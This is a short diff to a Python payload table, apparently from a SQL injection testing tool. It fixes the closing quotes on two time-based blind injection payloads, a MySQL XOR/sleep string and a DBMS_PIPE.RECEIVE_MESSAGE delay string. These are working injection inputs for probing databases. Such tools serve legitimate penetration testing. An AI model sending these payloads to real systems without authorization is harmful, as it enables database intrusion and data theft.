@@ -5338,7 +5338,7 @@ PAYLOADS = {
                 "dbms": "MySQL",
             },
             {
-                "payload": "\"XOR(if%20%20(%2029%20!=%20%2093%20,%20sleep%20%20(%20(%20(%20%20(%2010%20%20)%20)%20%20)%20)%20,%200%20%20))XOR"",
+                "payload": "\"XOR(if%20%20(%2029%20!=%20%2093%20,%20sleep%20%20(%20(%20(%20%20(%2010%20%20)%20)%20%20)%20)%20,%200%20%20))XOR\"",
                 "comments": [
                     {"pref": "", "suf": ""},
                 ],
@@ -5401,7 +5401,7 @@ PAYLOADS = {
                 "dbms": "MySQL",
             },
             {
-                "payload": "\"||DBMS-PIPE.RECEIVEMESSAGE('IsjT',10)||"",
+                "payload": "\"||DBMS-PIPE.RECEIVEMESSAGE('IsjT',10)||\"",
                 "comments": [
                     {"pref": "", "suf": ""},
                 ],
